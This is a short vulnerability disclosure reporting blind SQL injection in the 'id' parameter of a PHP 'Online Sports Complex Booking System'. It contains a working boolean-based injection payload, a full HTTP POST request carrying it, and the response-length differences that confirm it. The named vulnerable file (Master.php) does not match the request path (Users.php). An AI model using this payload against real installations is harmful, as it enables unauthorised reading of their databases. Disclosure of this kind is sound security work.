# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: \scbs\classes\Master.php?f=delete

Vulnerability location: /scbs/classes/Master.php?f=delete, id

Current database name: scbs_db,length is 7

[+] Payload: 11' and length(database()) = 7--+

```sql
POST /scbs/classes/Users.php?f=delete HTTP/1.1
Host: 192.168.1.19
Content-Length: 37
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/scbs/admin/?page=user/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p5eujbkhl692v4hpr6ltptnq06
Connection: close

id=11' and length(database()) = 7--+  // Leak place ---> id
```

When length (database ()) = 6, Content-Length: 269

![image](https://user-images.githubusercontent.com/54017627/165213918-ca001b08-af07-4e09-ae77-840cb66f2e8e.png)

When length (database ()) = 7, Content-Length: 19

![image](https://user-images.githubusercontent.com/54017627/165213959-92298531-c532-402e-9041-1bb4d076e45f.png)

